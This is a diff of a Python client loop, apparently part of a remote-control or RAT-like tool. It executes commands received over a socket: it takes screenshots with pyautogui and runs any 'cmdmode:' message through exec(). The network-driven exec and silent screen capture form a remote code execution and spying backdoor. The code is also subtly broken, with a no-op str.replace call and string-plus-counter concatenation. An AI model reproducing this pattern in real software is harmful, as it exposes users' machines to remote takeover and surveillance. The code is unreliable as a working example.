@@ -18,20 +18,22 @@ try:
         if not data:
             break
         
-        print(isinstance(data, bytes))
-        if isinstance(data, bytes):
-            dec = data.decode()
-            print(dec)
-            if dec == "1":
-                client.send(ClientUI.Connect().encode())
-            elif dec == "2" and not th.is_alive():
-                th.start()
-            elif dec == "3":
-                pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
-                screeniecounter = screeniecounter + 1
-            elif "cmdmode:" in  dec:
-                str.replace('cmdmode:', '')
-                exec(dec)
+        try:
+            data = data.decode()
+        except Exception as e:
+            pass
+        
+        print(data)
+        if data == "1":
+           client.send(ClientUI.Connect().encode())
+        elif data == "2" and not th.is_alive():
+            th.start()
+        elif data == "3":
+            pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
+            screeniecounter = screeniecounter + 1
+        elif "cmdmode:" in data:
+            str.replace('cmdmode:', '')
+            exec(data)
         else:
             print(data)
     print("Update Window")
